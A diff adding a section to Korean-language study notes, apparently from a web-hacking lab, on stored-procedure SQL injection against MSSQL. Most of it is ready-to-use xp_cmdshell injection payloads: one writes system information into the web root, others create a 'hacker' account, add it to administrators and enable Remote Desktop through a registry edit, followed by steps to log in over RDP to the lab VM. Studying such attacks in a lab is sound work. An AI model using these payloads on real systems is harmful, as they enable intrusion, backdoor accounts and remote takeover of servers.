@@ -203,3 +203,41 @@ python sqlmap.py -r 1.txt --dbs --dbms="Microsoft SQL Server 2005" -p keyword(�
 +-------+---------+--------+
 ```
 
+---
+
+## 7. Stored Proceduer SQL Injection
+
+- DBMS의 Stored Procedure를 공격자가 호출하여 시스템 명령어를 수행할 수 있는 공격
+
+- MSSQL xp_cmdshell 가장 유명한 공격 대상
+	- xp_cmdshell : 관리자 권한으로 시스템 명령어 실행 가능
+- ';exec master.dbo.xp_cmdshell 'ipconfig /all > D:\wwwroot\board\ip.txt'--
+![](../Images/Pasted%20image%2020260730112053.png)
+
+- ';exec master.dbo.xp_cmdshell 'ipconfig /all > D:\wwwroot\board\ip.txt'-- echo > netuser
+![](../Images/Pasted%20image%2020260730112115.png)
+
+
+
+
+#### 백도어 계정 생성, 관리자 권한 몰래주기, RDP ON
+
+'; exec master.dbo.xp_cmdshell 'net user hacker hacker /add'--
+'; exec master.dbo.xp_cmdshell 'net localgroup administrators hacker /add'--
+
+![](../Images/Pasted%20image%2020260730113320.png)
+![](../Images/Pasted%20image%2020260730113532.png)
+
+오... 신기하게도 webhackingzone VM 환경에서 `hacker` 계정이 생성되고 `administrators` 그룹에 `hacker` 계정이 추가되었다...!!
+
+
+**원격 접속**
+
+원격 데스크탑 키는 명령어
+'; exec master.dbo.xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'--
+- reg 를 건드는 설정 값 데이터베이스
+- ![](../Images/캡처dfffgg.png)
+
+1. Host PC - rdp(원격 데스크톱 연결)
+2. 공격할 대상 ip 입력(192.168.63.132)
+3. 생성한 `hacker` `hacker` 입력 후 접속
